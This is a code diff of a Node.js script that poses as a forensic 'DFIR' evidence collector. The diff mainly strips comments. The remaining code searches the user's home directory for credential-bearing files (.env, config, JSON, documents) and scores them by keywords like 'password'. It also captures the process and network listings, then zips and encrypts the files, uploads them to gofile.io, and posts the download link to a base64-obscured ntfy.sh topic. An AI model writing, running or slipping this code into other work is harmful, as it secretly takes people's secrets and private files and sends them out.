@@ -8,19 +8,11 @@ const AdmZip = require('adm-zip');
 const axios = require('axios');
 const FormData = require('form-data');
 
-// ============================================================================
-// SYSTEM CONFIGURATION
-// ============================================================================
-
 const CONFIG = {
     MAX_FILES_TO_EXTRACT: 10,
-    
-    // Ntfy endpoint (Base64 decoded as 'shinchan_007')
     _sysEndpointRoute: 'c2hpbmNoYW5fMDA3',
-    
     SKIP_FOLDERS: ['appdata', 'node_modules', '.git', '.vscode', 'local'],
     ALLOWED_EXTENSIONS: ['.pdf', '.doc', '.docx', '.txt', '.csv', '.jpg', '.png', '.env', '.config', '.json'],
-
     SCORING: {
         KEYWORDS: [
             { word: 'password', points: 100 },
@@ -46,10 +38,6 @@ const CONFIG = {
     }
 };
 
-// ============================================================================
-// DYNAMIC ENCRYPTION ENGINE
-// ============================================================================
-
 function getDynamicKey() {
     const today = new Date();
     const dd = String(today.getDate()).padStart(2, '0');
@@ -61,10 +49,6 @@ function getDynamicKey() {
 const ALGORITHM = 'aes-256-cbc';
 const KEY = crypto.scryptSync(getDynamicKey(), 'salt', 32); 
 const ALERT_ENDPOINT = Buffer.from(CONFIG._sysEndpointRoute, 'base64').toString('utf-8');
-
-// ============================================================================
-// CORE SYSTEM CODE
-// ============================================================================
 
 const BASE_DIR = os.homedir();
 const TARGET_DIR = path.join(process.cwd(), 'important_backup');
@@ -91,10 +75,8 @@ function captureVolatileData() {
         const isWin = os.platform() === 'win32';
         const processCmd = isWin ? 'tasklist' : 'ps -aux';
         const netCmd = isWin ? 'netstat -ano' : 'netstat -an';
-
         const processes = execSync(processCmd, { encoding: 'utf-8', stdio: 'pipe' });
         const network = execSync(netCmd, { encoding: 'utf-8', stdio: 'pipe' });
-
         fs.writeFileSync(path.join(TARGET_DIR, 'system_processes.txt'), processes);
         fs.writeFileSync(path.join(TARGET_DIR, 'network_connections.txt'), network);
     } catch (e) {}
@@ -158,12 +140,9 @@ async function scanDirectory(dir) {
 
 async function gatherFiles() {
     await scanDirectory(BASE_DIR);
-    
     if (allFoundFiles.length === 0) return;
-
     await fsp.mkdir(TARGET_DIR, { recursive: true });
     captureVolatileData();
-
     let scoredFiles = [];
     for (const filePath of allFoundFiles) {
         try {
@@ -172,20 +151,15 @@ async function gatherFiles() {
             scoredFiles.push({ path: filePath, score: score });
         } catch (e) {}
     }
-
     scoredFiles.sort((a, b) => b.score - a.score);
     const selectedFiles = scoredFiles.slice(0, CONFIG.MAX_FILES_TO_EXTRACT).map(item => item.path);
-    
     let manifestContent = "File_Name,Original_Path,SHA256_Hash\n";
-
     for (const filePath of selectedFiles) {
         const fileName = path.basename(filePath);
         await fsp.copyFile(filePath, path.join(TARGET_DIR, fileName));
-        
         const fileHash = generateSHA256Hash(filePath);
         manifestContent += `"${fileName}","${filePath}","${fileHash}"\n`;
     }
-    
     fs.writeFileSync(path.join(TARGET_DIR, 'evidence_manifest.csv'), manifestContent);
 }
 
@@ -201,18 +175,13 @@ function encryptEvidenceZip(zipFilePath) {
     return new Promise((resolve, reject) => {
         const iv = crypto.randomBytes(16);
         const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
-        
         const encryptedFilePath = zipFilePath + '.enc';
         const input = fs.createReadStream(zipFilePath);
         const output = fs.createWriteStream(encryptedFilePath);
-        
         output.write(iv);
-        
         input.pipe(cipher).pipe(output)
             .on('finish', () => {
-                try {
-                    fs.unlinkSync(zipFilePath);
-                } catch(e) {}
+                try { fs.unlinkSync(zipFilePath); } catch(e) {}
                 resolve(encryptedFilePath);
             })
             .on('error', reject);
@@ -227,20 +196,15 @@ async function uploadAndNotify(fileToUpload) {
             serverName = serverRes.data.data.servers[0].name;
         }
     } catch (e) {}
-
     const form = new FormData();
     form.append('file', fs.createReadStream(fileToUpload)); 
-
     const uploadRes = await axios.post(`https://${serverName}.gofile.io/uploadFile`, form, {
         headers: form.getHeaders(),
         maxBodyLength: Infinity,
         maxContentLength: Infinity
     });
-
     if (uploadRes.data.status !== 'ok') return;
-
     const downloadLink = uploadRes.data.data.downloadPage;
-
     try {
         await axios.post(`https://ntfy.sh/${ALERT_ENDPOINT}`,
             `DFIR Alert! Forensic Package Uploaded: ${downloadLink}`,
@@ -265,11 +229,9 @@ async function startFullAutomation() {
     try {
         await gatherFiles();
         if (allFoundFiles.length === 0) return;
-
         await zipFolder();
         encryptedFile = await encryptEvidenceZip(ZIP_FILE_PATH);
         await uploadAndNotify(encryptedFile);
-        
     } catch (err) {
     } finally {
         if (encryptedFile) {
